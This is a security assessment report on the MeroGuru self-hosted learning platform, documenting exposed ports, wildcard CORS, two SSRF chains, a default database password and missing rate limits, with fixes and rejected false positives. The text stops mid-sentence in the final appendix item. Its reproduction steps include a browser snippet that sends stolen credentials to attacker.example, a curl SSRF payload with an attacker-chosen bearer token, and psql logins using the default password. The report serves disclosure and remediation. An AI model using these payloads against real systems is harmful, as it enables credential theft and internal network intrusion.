# MeroGuru — Security Assessment Report

**Date:** 2026-09-16
**Target:** MeroGuru — self-hosted, single-user adaptive learning platform
**Scope commit:** `52d136f` (branch `master`)
**Assessment type:** Full-source white-box review with runtime proof-of-concept validation, followed by a formal false-positive verification pass

---

## Scope

| Component | Path | Reviewed |
|---|---|---|
| Orchestrator API (FastAPI) | `apps/api` | Yes |
| Brain microservice (FastAPI, stateless) | `apps/brain` | Yes |
| Celery workers | `workers/` | Yes |
| React frontend (Vite) | `apps/web` | Yes |
| Shared packages | `packages/ai_providers`, `packages/connectors`, `packages/learning_engine` | Yes |
| Deployment | `docker-compose.yml`, `apps/*/Dockerfile`, `.github/workflows/ci.yml` | Yes |

> **Note on line references.** Every `file:line` citation below describes the code as
> assessed at commit `52d136f`. Remediation has since landed (see **Remediation
> status**), so several cited lines -- and the `SECURITY.md` text quoted in V1 -- no
> longer match `HEAD`. Findings are recorded against the assessed commit deliberately,
> so this stays a faithful record of what was found.

Total reviewed: **3,435 LOC**. Out of scope: third-party container images (`pgvector/pgvector:pg16`, `redis:7-alpine`, `ollama/ollama:latest`) beyond their compose configuration.

## Methodology

1. **Manual source review** of all 3,435 LOC, tracing every externally reachable entry point to its sinks.
2. **Static analysis:** semgrep (`p/security-audit`, `p/secrets`, `p/python`, `p/javascript`, `p/react`, `p/docker`, `p/owasp-top-ten`), bandit, trivy config.
3. **Dependency analysis:** pip-audit (both Python services), npm audit (frontend).
4. **Secret scanning:** gitleaks over the full commit history.
5. **Runtime validation:** 3 executable proof-of-concept exploits run against the live code paths.
6. **False-positive verification (Trail of Bits `fp-check` methodology):** for each of 14 candidate findings — data-flow analysis to prove attacker control reaches the sink, exploitability verification, impact assessment, PoC creation where feasible, a 13-question devil's-advocate challenge, and a 6-gate review. **6 findings were confirmed TRUE POSITIVE; 8 were rejected as FALSE POSITIVE** and are documented in Appendix A.

CVSS v3.1 base vectors are provided where a defensible vector exists. Where a finding's impact is entirely derivative of another finding, this is stated rather than double-counted.

---

## Executive summary

MeroGuru's application code is, on the whole, well built. There is no SQL injection, no dangerous evaluation or deserialization anywhere in the tree, the frontend handles untrusted markdown correctly, credentials are encrypted with Fernet and fail closed, and the AI adaptation pipeline has genuinely strong guardrails against prompt injection (schema validation, enum constraints, confidence gating, and a verdict layer that refuses any AI suggestion which would weaken the deterministic floor). Bandit, pip-audit, npm audit and gitleaks all came back clean. This is not a codebase with a sloppiness problem.

It has an **assumption** problem. A single premise — *"single-user and self-hosted means there is no attacker"* — is load-bearing for the entire design. It is stated explicitly in the source, at `apps/api/app/main.py:12`:

```python
allow_origins=["*"],  # single-user, locally self-hosted app: no cross-user data to protect
```

That premise fails in two independent directions, and every confirmed finding in this report descends from one of them:

- **It fails at the local network boundary.** `docker-compose.yml` publishes all six service ports with no host-IP binding, and Docker's published ports are DNAT'd in `nat/PREROUTING` — *before* the `filter/INPUT` chain where host firewalls like ufw operate. "Self-hosted" therefore does not mean "only I can reach it"; it means "anyone on my LAN can reach it," including an unauthenticated API, an unauthenticated brain service, and a Postgres instance whose password is `change-me`. `SECURITY.md:9-10` tells operators the opposite.
- **It fails at the browser boundary.** Wildcard CORS on an API with *zero* authentication means any web page the operator visits can drive the full API. The source comment answers the wrong question: the exposure is cross-**origin**, not cross-**user**. There is exactly one user, and their browser is the attack surface.

Because there is no authentication anywhere in the system (verified by an exhaustive grep for every FastAPI auth primitive across `apps/api`, `apps/brain`, `packages/` and `workers/` — zero hits), these two boundary failures are not merely exposure issues. They convert three otherwise-internal behaviours into remotely reachable vulnerabilities: a server-side request forgery with full response-body exfiltration (V3), an unauthenticated SSRF proxy that will attach an attacker-chosen `Authorization` header to internal requests (V4), and unmetered consumption of the operator's paid AI credits (V6).

**The highest-impact finding is V4.** Unlike the others it requires no credential setup, no valid encryption key, and no browser: a single unauthenticated HTTP POST to the brain service is sufficient.

The recommended direction is not to add a login system. It is to stop treating "single-user" as a synonym for "trusted network and trusted browser": bind published ports to `127.0.0.1`, replace wildcard CORS with an explicit origin allowlist, require a shared secret on the brain service, and validate provider `base_url` values against an egress allowlist.

---

## Findings summary

| ID | Title | Severity | CVSS v3.1 base | Component |
|---|---|---|---|---|
| V1 | All service ports published on every interface; host firewall bypassed | **Critical** | 9.6 — `AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | `docker-compose.yml` |
| V3 | SSRF with response-body exfiltration via credential `base_url` | **Critical** | 9.3 — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | `apps/api`, `packages/ai_providers` |
| V4 | Brain service is an unauthenticated SSRF proxy with attacker-controlled auth header | **Critical** | 9.3 — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | `apps/brain` |
| V2 | Wildcard CORS on an API with zero authentication | **High** | 9.3 base, reduced to High by environmental modifiers — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` | `apps/api/app/main.py` |
| V5 | Database password cannot be changed via `.env` | **Medium** | Not independently scored (see finding) | `docker-compose.yml` |
| V6 | No rate limiting or request-size limits | **Medium** | 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L` | `apps/api` |

V1 is the keystone: it is what makes V3, V5 and V6 remotely reachable. V4 is independently reachable from any container on the Docker bridge network even if V1 is fixed.

---

## V1 — All service ports published on every interface; host firewall bypassed

**Severity:** Critical
**CVSS v3.1:** 9.6 — `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
(Adjacent-network attack vector; scope changed because reaching Postgres and the brain service crosses the trust boundary the compose file is presumed to establish.)

**Affected component:** `docker-compose.yml:11-12, 22-23, 35-36, 44-45, 69-70, 106-107`
**Related documentation defect:** `SECURITY.md:9-10`

### Description

Every service in the stack publishes its port with a bare `"HOST:CONTAINER"` mapping and no host-IP prefix:

| Service | Mapping | Line |
|---|---|---|
| postgres | `"5432:5432"` | 12 |
| redis | `"6379:6379"` | 23 |
| ollama | `"11434:11434"` | 36 |
| brain | `"8100:8100"` | 45 |
| api | `"8000:8000"` | 70 |
| web | `"3000:3000"` | 107 |

When the host IP is omitted, Docker defaults `HostIp` to `0.0.0.0` — the port is bound on every interface, not on loopback. This is compounded by how Docker implements publishing: it installs DNAT rules in the `nat/PREROUTING` chain, which iptables evaluates **before** the `filter/INPUT` chain where host firewalls such as ufw place their rules. A packet destined for a published container port is rewritten and forwarded to the `DOCKER` chain without ever being offered to `INPUT`. An operator who runs `ufw default deny incoming` therefore gets no protection at all for these six ports, and no warning that this is the case.

`SECURITY.md:9-10` states the opposite:

> **Network exposure**: by default the app binds to localhost via Docker port mapping.

This is factually incorrect, and it is the most damaging part of the finding: it tells a security-conscious operator that a control exists when it does not, so they do not go looking for one.

The Postgres service additionally hardcodes `POSTGRES_PASSWORD: change-me` (`docker-compose.yml:7`), and per V5 that password cannot be changed via `.env`.

### Reproduction

1. `docker compose up -d` on a host with a LAN IP (e.g. `192.168.1.50`).
2. From any other host on the same network:
   - `psql "postgresql://meroguru:change-me@192.168.1.50:5432/meroguru"` — full read/write database access.
   - `curl http://192.168.1.50:8000/api/v1/credentials` — the API, with no credential.
   - `curl -X POST http://192.168.1.50:8100/brain/v1/adapt -d @payload.json` — the brain service, with no credential (see V4).
3. Optionally enable `ufw default deny incoming` on the host first and repeat step 2: the results are unchanged.

### Impact

Any host on the same network segment — a compromised IoT device, a guest on the same Wi-Fi, another tenant on a shared VLAN, or an attacker on a coffee-shop network if the operator runs the stack on a laptop — obtains:

- **Full database compromise.** Read and write access to all learner data and all stored credential ciphertext, using a publicly documented default password.
- **Full API control.** Every endpoint, unauthenticated: create goals, create credentials, trigger generation, read jobs.
- **Full brain-service control**, which is an SSRF primitive in its own right (V4).
- **Ollama model control** on port 11434 (model pull/delete/inference).

This finding is the precondition that makes V3, V5 and V6 remotely reachable rather than local-only.

### Caveat — unverified sub-claim (Redis)

**The Redis sub-claim is UNVERIFIED and is stated here as an open question, not as a confirmed exposure.** Redis 7 ships with `protected-mode` enabled, and per the Redis security documentation, protected mode refuses connections from non-loopback addresses when no password is configured *and* no `bind` directive is set — which is the configuration this compose file produces. It is therefore plausible that port 6379 rejects remote clients despite being published. Note the corollary: if protected mode is in fact active, the shipped Celery broker path (`redis://redis:6379/0`, a non-loopback connection from the api/worker containers) would also need empirical confirmation that it works as shipped. Docker was unavailable in the test environment, so neither the exposure nor the corollary was tested. **This should be resolved by an empirical test before relying on either conclusion.** All other ports in the table above are exposed by Docker's default behaviour with no such mitigating mechanism.

### Recommended remediation

- Bind every published port to loopback explicitly: `"127.0.0.1:8000:8000"`, and so on for all six services.
- Remove the `ports:` block entirely from `postgres`, `redis`, `ollama` and `brain` — none of these need host reachability; the api/worker/web services reach them over the Docker bridge network by service name.
- Correct `SECURITY.md:9-10` to state what the compose file actually does, and add an explicit warning that Docker's published ports bypass `filter/INPUT` firewall rules.
- Generate the Postgres password rather than shipping `change-me` (see V5).

---

## V2 — Wildcard CORS on an API with zero authentication

**Severity:** High
**CVSS v3.1:** base 9.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`, reduced to **High** by the environmental modifiers described below.

**Affected component:** `apps/api/app/main.py:10-15`

### Description

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # single-user, locally self-hosted app: no cross-user data to protect
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`allow_credentials` is not set, so it defaults to `False` and the browser will not attach cookies or HTTP auth. **That concession costs an attacker nothing**, because the API has no authentication to bypass. A repo-wide grep for every FastAPI/Starlette authentication primitive — `Depends(...)` referencing auth/`current_user`/token, `HTTPBearer`, `HTTPBasic`, `APIKeyHeader`, `OAuth2*`, JWT handling, and session cookies — across `apps/api`, `apps/brain`, `packages/` and `workers/` returns **zero matches**. Every route is open to every caller. Authorization is therefore purely a function of network reachability, and wildcard CORS grants browser reachability to every website on the internet.

The inline comment answers the wrong threat model. "No cross-user data to protect" is true — there is one user. The exposure is **cross-origin**: any page that user visits can issue reads *and writes* against their API and read the responses. Concretely, an attacker page can enumerate `GET /api/v1/credentials`, create a malicious credential, trigger plan generation, and read job error output — which is exactly the chain in V3.

### Reproduction

1. Run the stack; the API is on `http://localhost:8000`.
2. Serve an attacker page from any origin containing:
   ```js
   fetch("http://localhost:8000/api/v1/credentials")
     .then(r => r.json())
     .then(d => fetch("https://attacker.example/x", {method:"POST", body: JSON.stringify(d)}));
   ```
3. Visit the page in a browser. The wildcard `Access-Control-Allow-Origin` permits the cross-origin read.

### Environmental mitigation (stated precisely)

This is materially mitigated in some browsers and not at all in others:

- **Chrome 142+ and current Firefox** gate requests from a public origin to a loopback/private address behind a **Local Network Access** permission prompt. Starlette's `CORSMiddleware` emits no LNA/PNA response headers, so the request is gated. In these browsers the drive-by path requires an explicit user grant.
- **Safari grants local network access implicitly, with no prompt.** The drive-by path is unmitigated there.
- The gating is on *public-origin → local-address* transitions only. Any attacker page already in the local address space — a compromised device on the LAN serving HTTP, a malicious page on another locally hosted service, or content reached via V1 — is **not** gated in any browser.

This is why the finding is rated High rather than Critical, and why it should not be rated lower: for a meaningful share of deployments there is no prompt at all.

### Impact

Full unauthenticated read/write control of the API by any web page the operator visits, subject to the browser conditions above. This is the second delivery path (alongside V1) for V3 and V6.

### Recommended remediation

- Replace `allow_origins=["*"]` with an explicit allowlist of the frontend origin(s), e.g. `["http://localhost:3000"]`, sourced from configuration.
- Constrain `allow_methods` and `allow_headers` to what the frontend actually sends rather than `["*"]`.
- Replace the inline comment with one that states the actual reasoning (cross-origin, not cross-user).
- Consider a locally generated shared secret required on all API routes; this closes the class rather than one instance of it.

---

## V3 — SSRF with response-body exfiltration via credential `base_url`

**Severity:** Critical
**CVSS v3.1:** 9.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`
(Network reachability is supplied by V1 or V2; scope changed because the forged request originates inside the deployment's network position and reaches hosts the attacker cannot otherwise address.)

**Affected components:**
- `apps/api/app/schemas/credential.py:9-14` — `CredentialCreate.base_url: str | None = None` (no validation)
- `apps/api/app/api/v1/credentials.py:24-26` — `POST /api/v1/credentials`, no authentication
- `packages/ai_providers/registry.py` — `build_provider()` (`openai_compatible` branch) passes `base_url` through unchecked
- `packages/ai_providers/openai_compatible.py:55-60` — outbound request and error reflection
- `workers/tasks.py:42-56` — generic exception handler persists `str(exc)[:500]`
- `apps/api/app/schemas/job.py:15` — `JobOut.error_summary` returns it to any caller

### Description

`CredentialCreate.base_url` is typed `str | None` with **no scheme validation, no host validation, and no allowlist**. The `provider` field is pattern-constrained, but `openai_compatible` is one of the accepted values and that provider's documented purpose is to accept an arbitrary endpoint. The value flows unmodified into an outbound HTTP request:

```python
# packages/ai_providers/openai_compatible.py:55-60
async with httpx.AsyncClient(timeout=DEFAULT_TIMEOUT) as client:
    resp = await client.post(
        f"{self.base_url}/chat/completions", headers=self._headers(), json=payload
    )
if resp.status_code >= 400:
    raise AIProviderError(f"provider error {resp.status_code}: {resp.text[:500]}")
```

Line 60 is what elevates this from blind SSRF to full response-body exfiltration: **up to 500 bytes of the internal target's response body are embedded in the exception message.**

That exception is not contained. `generate_concept_map` is wrapped only in `except ConceptGraphError` (`apps/api/app/services/plan_service.py:45-46`), and `AIProviderError` is not a subclass of `ConceptGraphError` (`packages/learning_engine/concept_mapping.py:44` — `class ConceptGraphError(ValueError)`). The `AIProviderError` therefore propagates past the specific handler to the generic one in the Celery task:

```python
# workers/tasks.py:42-56
except Exception as exc:  # unexpected errors still leave a visible, recoverable job state
    ...
    job.error_summary = str(exc)[:500]
```

and `error_summary` is exposed by `JobOut` (`apps/api/app/schemas/job.py:15`) through `GET /api/v1/jobs/{job_id}` (`apps/api/app/api/v1/jobs.py:15-20`), which has no authentication.

### Reproduction — full unauthenticated chain

```
POST /api/v1/goals                      -> {"id": GOAL_ID}
POST /api/v1/credentials                -> provider=openai_compatible,
                                           base_url=http://<internal-target>
POST /api/v1/goals/{GOAL_ID}/generate-plan  -> {"job_id": JOB_ID}
GET  /api/v1/jobs/{JOB_ID}              -> error_summary contains the target's response body
```

### Evidence — PoC output

An executable proof of concept was run against the real code path and confirmed the exfiltration primitive. Observed output:

```
job.error_summary : provider error 403: {"internal":"db_password=s3cr3t-prod-pw; aws_session_token=ASIA..."}
```

**Secondary blind oracle:** `POST /api/v1/credentials/{id}/test` (`apps/api/app/api/v1/credentials.py:29-46`) performs a `GET {base_url}/models` and persists the outcome to `credential.validation_detail` (line 43), which is returned by `CredentialOut` (`apps/api/app/schemas/credential.py:24`). This yields a reachability/port-scan oracle even where the primary path is unavailable.

### Preconditions (documented honestly)

Two conditions constrain real-world exploitation and should be weighed by the maintainer:

- **(a) Reachability.** An attacker who is not the operator must first reach `POST /api/v1/credentials` — via V1 (LAN) or V2 (the operator's browser). Note that for the operator themselves, a custom `base_url` is not a vulnerability at all; it is the documented *feature* of the `openai_compatible` provider. The vulnerability exists because the endpoint is unauthenticated, not because the field is configurable.
- **(b) A valid `CREDENTIAL_ENCRYPTION_KEY`.** `create_credential` calls `encrypt_secret` (`apps/api/app/services/credential_service.py:25`), which constructs `Fernet(settings.credential_encryption_key.encode())` (`apps/api/app/core/crypto.py:16-21`). Fernet rejects the shipped `change-me` placeholder with a `ValueError` (empirically verified). **Deployments left at the default are incidentally immune to this specific chain** — an accidental mitigation, not a designed one, and one that disappears the moment the operator configures a real key.

### Impact

Server-side request forgery from inside the deployment's network position, with up to 500 bytes of each response returned to an unauthenticated caller. Targets include cloud instance metadata services, other containers on the Docker bridge network (including the brain service and Postgres's HTTP-adjacent neighbours), and any host reachable from the deployment but not from the attacker. Combined with the `/test` oracle this supports internal network mapping. Confidentiality impact is High; integrity is Low (the attacker controls the request path and body shape only within the `/chat/completions` POST template).

### Recommended remediation

- Validate `base_url` at the schema boundary: require `https://` (or `http://` only for explicitly allowlisted local hosts), resolve the hostname, and reject any address in a private, loopback, link-local (notably `169.254.169.254`), or multicast range. Re-check after DNS resolution and pin the connection to the validated address to avoid DNS rebinding.
- Stop reflecting upstream response bodies. Replace `resp.text[:500]` in `packages/ai_providers/openai_compatible.py:60` (and the identical construction at lines 88 and 131) with the status code only; log the body server-side if needed for debugging.
- Sanitize `job.error_summary` before persisting, or return a stable error code to API consumers and keep free-text detail server-side.
- Authenticate `POST /api/v1/credentials` and `GET /api/v1/jobs/{id}`.

---

## V4 — Brain service is an unauthenticated SSRF proxy with attacker-controlled auth header

**Severity:** Critical
**CVSS v3.1:** 9.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`

**Affected components:**
- `apps/brain/app/main.py:44-53` — `POST /brain/v1/adapt`, no authentication
- `apps/brain/app/schemas.py:8-13, 24-30` — `ProviderConfig` with attacker-controlled `base_url` and `api_key`
- `packages/ai_providers/openai_compatible.py:42-43, 55-58` — header construction and outbound request
- `docker-compose.yml:44-45` — port 8100 published on all interfaces

### Description

The brain service's adaptation endpoint accepts a complete provider configuration from the request body and builds a live provider from it:

```python
# apps/brain/app/main.py:44-53
@app.post("/brain/v1/adapt", response_model=AdaptResponse)
async def adapt(payload: AdaptRequest) -> AdaptResponse:
    try:
        provider = build_provider(
            provider=payload.provider.provider,
            api_key=payload.provider.api_key,
            base_url=payload.provider.base_url,
            ...
```

There is no authentication of any kind on this route — no dependency, no header check, no shared secret. `ProviderConfig` (`apps/brain/app/schemas.py:8-13`) declares both `base_url` and `api_key` as plain optional strings with no validation. The provider then attaches the caller's `api_key` verbatim as a bearer token on the outbound request:

```python
# packages/ai_providers/openai_compatible.py:42-43
def _headers(self) -> dict[str, str]:
    return {"Authorization": f"Bearer {self.api_key}", "Content-Type": "application/json"}
```

The attacker therefore controls **both the destination and the `Authorization` header** of a request originating from inside the deployment. This is strictly more powerful than a plain SSRF: it can be aimed at internal services that authenticate by bearer token, with a token the attacker chooses.

This is the **strongest finding in the report**. Unlike V3 it requires no goal, no credential-creation step, no valid Fernet key, and no browser — a single HTTP POST is sufficient. It is reachable two ways: from the LAN via the published port 8100 (V1), and from **any container on the Docker bridge network even if V1 is fixed**, since the brain service has no authentication at the application layer.

### Reproduction

```bash
curl -s -X POST http://<host>:8100/brain/v1/adapt \
  -H 'Content-Type: application/json' \
  -d '{
        "concept_id": "c1",
        "previous_mastery": 0.5,
        "practice_completion": 1.0,
        "current": {"score":0.5,"confidence":0.5,
                    "completed_at":"2026-09-16T00:00:00Z",
                    "time_spent_minutes":10,"estimated_minutes":10},
        "history": [],
        "provider": {
          "provider": "openai_compatible",
          "api_key": "ATTACKER-SUPPLIED-HEADER-VALUE",
          "base_url": "http://internal-target/internal-only"
        }
      }'
```

### Evidence — PoC output

An executable proof of concept was run and confirmed. Results observed:

- The brain service returned **HTTP 200 with no credential presented**.
- The instrumented internal target received:
  ```
  POST /internal-only/chat/completions
  Authorization: Bearer ATTACKER-SUPPLIED-HEADER-VALUE
  ```

Both the destination path and the authorization header were fully attacker-controlled.

### Impact

Unauthenticated SSRF from the brain service's network position against arbitrary hosts, with an attacker-chosen bearer token. In a homelab or cloud deployment this reaches instance metadata endpoints, internal admin APIs, and sibling containers. The response body is reflected back in the same way as V3 via the `AIProviderError` message path, so this is also an exfiltration primitive. Confidentiality High; integrity Low.

### Related issue — reclassified as defense-in-depth (not a primary vulnerability)

`apps/api` transmits **decrypted provider API keys in plaintext** to the brain service over unauthenticated HTTP: `get_active_ai_provider_config` (`apps/api/app/services/credential_service.py:86-114`) decrypts the stored secret at line 102 and returns it in a dict, which `brain_client.adapt` (`apps/api/app/services/brain_client.py:33-44`) posts as `payload["provider"]` to `http://brain:8100/brain/v1/adapt`. The credential is thus encrypted at rest and then sent in clear over the bridge network. This is **documented as a defense-in-depth gap rather than a primary vulnerability** because exploiting it requires an attacker to already hold a position on the Docker bridge network — a precondition that, if met, grants substantial access regardless. It is nonetheless worth fixing alongside V4: authenticating the brain service addresses both.

### Recommended remediation

- Require a shared secret on all `/brain/v1/*` routes — a value generated at deployment time, supplied to both services via `.env`, and verified in a FastAPI dependency. Reject requests without it.
- Remove the `ports:` mapping for the `brain` service in `docker-compose.yml:44-45`; nothing outside the compose network needs to reach it.
- Do not accept `base_url` from the request body at all. The brain service should resolve provider endpoints from its own configuration, or apply the same egress allowlist recommended in V3.
- Consider having the orchestrator pass a provider *reference* rather than a decrypted `api_key`, so the plaintext secret never crosses a process boundary.

---

## V5 — Database password cannot be changed via `.env`

**Severity:** Medium
**CVSS v3.1:** Not independently scored. The exploit impact of a weak database password is already counted in V1; scoring this finding separately would double-count it. Its distinct severity comes from the fact that it **silently defeats the operator's own remediation attempt**.

**Affected component:** `docker-compose.yml:5-8` (postgres), `57-61` (api), `82-86` (worker)

### Description

Three independent facts combine into a silent failure:

1. The `postgres` service hardcodes the password in its own `environment:` block, so it is not read from `.env` at all:
   ```yaml
   # docker-compose.yml:5-8
   environment:
     POSTGRES_USER: meroguru
     POSTGRES_PASSWORD: change-me
     POSTGRES_DB: meroguru
   ```
2. The `api` and `worker` services declare **both** `env_file: .env` **and** a hardcoded `environment:` block containing the same variable:
   ```yaml
   # docker-compose.yml:57-61 (api); identical at 82-86 (worker)
   env_file: .env
   environment:
     DATABASE_URL: postgresql+psycopg://meroguru:change-me@postgres:5432/meroguru
   ```
3. Docker Compose gives `environment:` **precedence** over `env_file:`.

### The failure mode — stated precisely

The problem is **not** that the application breaks. It is the opposite, and that is what makes it dangerous.

An operator reads `.env.example`, sees `change-me`, correctly identifies it as a default credential, and edits `DATABASE_URL` in `.env` to a strong password. They restart the stack. **Everything works.** No error, no warning, no failed connection — because the `environment:` block overrode their edit and the services are still connecting with `change-me`, and Postgres itself never read `.env` either, so its password is still `change-me` too. The operator has every reason to believe they have rotated the credential. They have not. A deliberate security action produced no effect and produced no signal that it produced no effect, which is precisely why it goes unnoticed indefinitely.

### Reproduction

1. Edit `.env` and set `DATABASE_URL=postgresql+psycopg://meroguru:a-strong-password@postgres:5432/meroguru`.
2. `docker compose up -d`. The stack starts normally with no error.
3. `docker compose exec api printenv DATABASE_URL` — still shows `change-me`.
4. `psql "postgresql://meroguru:change-me@127.0.0.1:5432/meroguru"` — still succeeds.

### Impact

Every deployment retains a publicly documented default database password, including deployments run by operators who explicitly tried to change it. Chained with V1 (port 5432 published on all interfaces), this yields full unauthenticated database compromise from any host on the local network. Since the credential ciphertext for provider API keys is stored in this database, it also broadens the blast radius of any `CREDENTIAL_ENCRYPTION_KEY` compromise.

### Recommended remediation

- Remove the hardcoded `DATABASE_URL` from the `environment:` blocks of `api` (line 59) and `worker` (line 84) and let `env_file: .env` supply it.
- Have the `postgres` service read its password from the environment too: `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:?POSTGRES_PASSWORD must be set}`. The `:?` form fails the stack at startup with a clear message if unset, rather than defaulting.
- Ship no working default. Document generating a password (e.g. `openssl rand -base64 32`) in setup instructions.
- Add a startup check that refuses to boot if the database password is `change-me`.

---

## V6 — No rate limiting or request-size limits

**Severity:** Medium
**CVSS v3.1:** 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`

**Affected component:** `apps/api` (all routes); most significantly `apps/api/app/api/v1/goals.py:65-79`

### Description

No rate limiting exists anywhere in the application. A repo-wide grep for `slowapi`, `ratelimit`, `limiter` and `max_upload` returns no matches, and neither `apps/api/requirements.txt` nor `apps/brain/requirements.txt` includes a limiter package. There are no request body size limits beyond framework defaults.

The consequential endpoint is `POST /api/v1/goals/{goal_id}/generate-plan` (`apps/api/app/api/v1/goals.py:65-79`), which is unauthenticated and enqueues a Celery job:

```python
job = BackgroundJob(job_type="generate_plan", ...)
db.add(job); db.commit(); db.refresh(job)
from workers.tasks import generate_plan_task
generate_plan_task.delay(str(goal_id), str(job.id))
```

Each job performs a concept-map generation plus one content generation per scheduled lesson, **against the operator's own paid AI provider key**.

### Amplification bound — stated precisely

Per-request cost **is** bounded, and the report should not overstate it:

- `minutes_per_day` is capped at 600 by `Field(default=30, gt=0, le=600)` (`apps/api/app/schemas/goal.py:14`).
- `horizon_days` is hardcoded to `7` in `generate_roadmap_and_plan` (`apps/api/app/services/plan_service.py:81`), so the planner can schedule at most 7 days of lessons.
- Each lesson generation requests `max_tokens=3500` (`apps/api/app/services/plan_service.py:125`); the single concept-map call requests `max_tokens=3000` (`packages/learning_engine/concept_mapping.py:71`).

Worst case per request: ~7 lesson generations plus one concept-map call, **roughly 27,500 `max_tokens` total**. That is a real but bounded cost.

**The unbounded quantity is the request count.** Nothing limits how many times an attacker may invoke the endpoint. Multiplying a bounded per-request cost by an unbounded request count is what produces the impact.

### Reproduction

1. `POST /api/v1/goals` once to obtain a goal ID.
2. Loop `POST /api/v1/goals/{id}/generate-plan` — each call returns `202` with a new `job_id` and enqueues another full generation.
3. Observe unbounded growth of the Celery queue and of outbound calls to the configured provider.

Delivery is via V1 (LAN) or V2 (any page the operator visits — the endpoint is a simple cross-origin POST with no preflight-blocking headers required).

### Impact

- **Financial:** unmetered consumption of the operator's paid AI provider credits.
- **Availability:** unbounded Celery queue growth and database row growth (`BackgroundJob` rows are committed before the task is dispatched), degrading or denying legitimate use.
- **Rate-limit exhaustion** at the upstream provider, affecting the operator's other usage of the same key.

Rated Medium rather than High because confidentiality and integrity are unaffected and the per-request cost is bounded.

### Recommended remediation

- Add a rate limiter (e.g. `slowapi`) with strict per-IP limits, and a much stricter limit on generation-triggering routes specifically.
- Reject a new `generate_plan` job for a goal that already has one `queued` or `running`, which also fixes accidental double-submission.
- Add a request body size limit at the reverse proxy or via middleware.
- Authenticate the API — with a shared secret in place, this finding reduces to abuse by the operator alone.

---

## Appendix A — Findings rejected as false positives

These 8 candidates were examined under the same methodology and **rejected as vulnerabilities**. They are recorded because knowing what was ruled out, and why, is part of the assessment's value. Several remain worthwhile as hardening; none should be tracked as security defects.

### A1 — Dev servers and root containers
**Claim:** `uvicorn --reload` over a bind mount (`docker-compose.yml:50, 75`), `vite` dev server, and no `USER` directive in any Dockerfile — all running as root.
**Verdict: REJECTED — Gate 3 (Real Impact) FAIL.** Achieving code execution via `--reload` requires the attacker to already have write access to the host bind-mounted source directory. An attacker with host filesystem write access has already won; the reload mechanism adds nothing. No attacker-controlled path writes to those directories.
**Still worth doing:** add a non-root `USER`, and ship a production compose overlay without `--reload` and bind mounts. Hardening, not a vulnerability.

### A2 — `/health/ready` information leak
**Claim:** `apps/api/app/main.py:31-43` returns `str(exc)` on database failure, leaking DB host, port, username and database name.
**Verdict: REJECTED — empirically disproven.** The actual code path was executed against the real compose DSN with SQLAlchemy 2.0.54 / psycopg 3.3.5. Observed outputs:
- Host unresolvable → `failed to resolve host 'postgres': [Errno 11001] getaddrinfo failed`
- Port closed → `connection timeout expired`

No username, password, port or database name is disclosed. The only leaked token is the string `postgres`, which is a Docker service name already published in the repository's own `docker-compose.yml`. The claim does not survive contact with the runtime.

### A3 — Unpinned Python dependencies
**Claim:** 14 `>=` constraints, 0 exact pins, no lockfile and no hashes across both Python services.
**Verdict: REJECTED as a vulnerability — Gate 2 (Exploitability) FAIL.** Exploitation requires first compromising an upstream PyPI package. No attacker-controlled path in this codebase influences dependency resolution.
**Still worth doing:** pin exact versions and add a hash-verified lockfile. Supply-chain hardening.

### A4 — CI actions on mutable tags, no `permissions:` block
**Claim:** `.github/workflows/ci.yml` references actions by mutable tag and declares no explicit token permissions.
**Verdict: REJECTED — Gate 2 FAIL.** Two mitigating facts are decisive: the workflow triggers on `push` and `pull_request` (**not** `pull_request_target`), so pull requests from forks receive a read-only `GITHUB_TOKEN`; and the workflow references **zero repository secrets**, so there is nothing for a compromised action to exfiltrate.
**Still worth doing:** pin actions to commit SHAs and add an explicit least-privilege `permissions:` block.

### A5 — `CREDENTIAL_ENCRYPTION_KEY=change-me` fails only at request time
**Claim:** the placeholder key is not validated at startup, so failure surfaces late.
**Verdict: REJECTED as a vulnerability — it FAILS CLOSED.** Empirically verified: `Fernet("change-me")` raises `ValueError`. `encrypt_secret` and `decrypt_secret` (`apps/api/app/core/crypto.py:20-28`) therefore cannot operate with the placeholder — no credential is ever stored or read under a weak key. This is in fact a **mitigating control**: it is what makes default-configured deployments immune to the V3 chain (see V3 precondition (b)).
**Still worth doing:** validate the key at startup so operators get a clear boot-time error instead of a runtime 500. A UX/fail-fast improvement only.

### A6 — `passlib[bcrypt]` dead dependency
**Claim:** a password-hashing library is present in a codebase with no authentication.
**Verdict: REJECTED.** A repo-wide grep finds exactly one occurrence — `apps/api/requirements.txt:8` — with zero code references. It is unused, not misused. Hygiene: remove it to shrink the dependency surface.

### A7 — Fernet key in CI workflow
**Claim:** a hardcoded encryption key at `.github/workflows/ci.yml:25`.
**Verdict: REJECTED.** Grep confirms a single occurrence, CI-only, already labelled in-line as a throwaway (`# Throwaway key for test isolation only -- never used for real data.`). It protects no real ciphertext and grants no access. Hygiene: moving it to a repository secret would reduce secret-scanner noise; it is not a disclosure.

### A8 — Missing field bounds on `LessonFeedback` / `AttemptSubmit`
**Claim:** unbounded float fields allow `Infinity`/`NaN` to poison mastery calculations.
**Verdict: REJECTED — attacker control confirmed, impact disproven.** The first half of the claim holds: FastAPI's `json.loads` accepts the non-standard `Infinity` and `NaN` literals, so `{"confidence": Infinity}` does parse and reach the engine. But the clamp at `packages/learning_engine/adaptation/deterministic_rules.py:76`:
```python
normalized_confidence = max(0.0, min(1.0, 1.0 - abs(signals.avg_confidence_gap)))
```
